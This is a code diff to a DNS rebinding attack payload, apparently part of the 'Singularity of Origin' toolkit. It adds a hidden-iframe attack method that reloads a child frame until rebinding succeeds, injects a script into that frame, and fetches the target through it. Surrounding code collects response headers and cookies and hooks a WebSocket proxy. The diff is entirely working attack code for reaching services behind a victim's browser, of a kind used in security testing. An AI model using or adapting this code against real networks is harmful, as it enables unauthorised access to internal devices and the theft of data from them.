@@ -1,3 +1,10 @@
+// Wrap `fetch()` API, so we can invoke it:
+// from the attack iframe (fetch attack method)
+// or from the child iframe of the attack iframe (iframe attack method)
+let sooFetch = function (resource, options) {
+    return fetch(resource, options)
+};
+
 const Rebinder = () => {
     let headers = null;
     let cookie = null;
@@ -44,14 +51,50 @@ const Rebinder = () => {
                         rebindingStatusEl.innerText = `DNS rebinding failed!`;
                     }
                     break;
-                case 'start':
+                case 'startFetch': // Fetch API attack method
+                    console.log('payload.js: Fetch API attack method');
                     timer = setInterval(function () { run() }, interval);
                     console.log('frame', window.location.hostname, 'waiting', interval,
                         'milliseconds for dns update');
                     break;
+                case 'startReloadChildFrame': // iframe attack method
+                    console.log('payload.js: iframe attack method');
+                    let f = document.createElement('iframe');
+                    f.src = url
+                    f.setAttribute('id', 'childFrame');
+                    f.setAttribute('style', "display: none");
+                    document.body.appendChild(f);
+                    sooFetch = (resource, options) => {
+                        const cw = document.getElementById('childFrame').contentWindow;
+                        return cw.fetch(resource, options)
+                    }
+                    document.getElementById('childFrame').onload = onChildFrameLoad;
+                    timer = setInterval(function () { document.getElementById('childFrame').src = `${window.origin}`; }, interval);           
             }
         });
     };
+
+    function onChildFrameLoad() {
+        console.log('payload.js: onChildFrameLoad');
+        let doc = document.getElementById('childFrame').contentDocument || document.getElementById('childFrame').contentWindow.document;
+        let content = doc.body.innerText;
+
+        if (content.indexOf("Singularity of Origin") !== 0) { 
+            injectScript( document.getElementById('childFrame'));
+            let p = sooFetch(url, {
+                credentials: 'omit',
+            });
+            run(p);
+        }
+    }
+    
+    function injectScript(frame) {
+        let doc = frame.contentDocument || frame.contentWindow.document;
+        let script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        script.innerHTML = `${sooFetch.toString()};`;
+        doc.body.append(script);
+    }
 
     function init(myUrl, myRebindingDoneFn) {
         url = myUrl;
@@ -62,11 +105,16 @@ const Rebinder = () => {
         }, "*");
     };
 
-    function run() {
-        fetch(url, {
-            credentials: 'omit',
-        })
-            .then(function (r) {
+    function run(prom) {
+        let p = null;
+        if (prom) {
+            p = prom;
+        } else {
+            p = sooFetch(url, {
+                credentials: 'omit',
+            })
+        }
+            p.then(function (r) {
 
                 let headerCount = 0;
                 for (let pair of r.headers.entries()) {
@@ -83,12 +131,6 @@ const Rebinder = () => {
 
                 headers = r.headers;
                 cookie = document.cookie;
-
-                /*if (r.headers.get('www-authenticate') !== null) {
-                    return new Promise(function (resolve, reject) {
-                        reject(new Error('requiresHttpAuthentication'));
-                    });
-                };*/
 
                 return r.text();
             })
@@ -216,7 +258,7 @@ function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
                 "body": "",
             }
 
-            const fetch_retry = (url, options, n) => fetch(url, options)
+            const fetch_retry = (url, options, n) => sooFetch(url, options)
                 .then(function (r) {
                     fetchResponse.response.headers = r.headers;
                     fetchResponse.response.ok = r.ok;
